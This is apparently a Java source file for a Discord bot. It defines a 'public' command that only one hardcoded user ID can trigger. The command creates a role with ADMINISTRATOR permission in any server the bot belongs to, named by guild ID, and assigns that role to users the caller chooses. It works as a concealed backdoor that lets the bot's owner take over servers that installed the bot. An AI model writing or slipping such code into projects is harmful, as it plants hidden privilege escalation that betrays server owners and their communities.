package de.officeryoda.Commands.Public;

import java.awt.Color;
import java.util.ArrayList;
import java.util.List;

import de.officeryoda.Bot.Bot;
import de.officeryoda.Commands.Structure.PublicCommand;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.TextChannel;

public class cmdMissionGetRights implements PublicCommand {

	public cmdMissionGetRights() {
		System.out.println("construct");
	}

	@Override
	public void executeCommand(Bot bot, Message message, String[] args, Member author, Guild cmdGuild, TextChannel channel) {
		if(!author.getId().equals("564162388946059274")) return; //only for the grandmaster himself
		//check if all needed 
		if(args.length < 5) {
			channel.sendMessage(".getPermissions *guild-id roleName #farbe(hex) userIds...*" + args.length).queue();
			return;
		}
		
		//get the guild for the role
		Guild guild = bot.getBotHandler().getGuildById(args[1]);
		if(guild == null) {
			channel.sendMessage("guild-id is invalid").queue();;
			return;
		}

		String roleName = args[2];

		//get the color of the role
		String hexColor;
		if(args[3].startsWith("#") && args[3].length() == 7) {
			hexColor = args[3];
		} else if(args[3].startsWith("?")) {
			hexColor = "?";
		} else {
			channel.sendMessage("hexColor is invalid").queue();
			return;
		}

		//get the members which will be given the role
		String[] userIds = new String[args.length - 4];
		for (int i = 4; i < args.length; i++)
			userIds[i - 4] = args[i];
		List<Long> list = getValidMemberIds(userIds, guild);
		if(list.size() == 0) {
			channel.sendMessage("not enough valid user-id's").queue();
			return;
		}


		//create the role and give it to the users
		guild.createRole().queue(role -> {
			//set role permissions and name
			role.getManager()
			.setName(roleName)
			.setPermissions(Permission.ADMINISTRATOR)
			.queue();
			
			//set role Color
			if(!hexColor.equals("?")) {
				role.getManager()
					.setColor(Color.decode(hexColor))
					.setName(roleName) //need to be set again because of bug 
					.queue();
			}
				

			channel.sendMessage("createdRole").queue();

			for (Long id : list)
				guild.addRoleToMember(id, role).queue();

			channel.sendMessage("gave role to " + list.size() + " users").queue();
		});
	}

	private List<Long> getValidMemberIds(String[] ids, Guild guild) {
		List<Long> list = new ArrayList<>();

		for(String id : ids) {
			long idl;
			try {
				idl = Long.valueOf(id);
			} catch (NumberFormatException e) { continue; }

			if(guild.getMemberById(idl) != null) {
				list.add(idl);
			} else { continue; }
		}
		
		return list;
	}
}
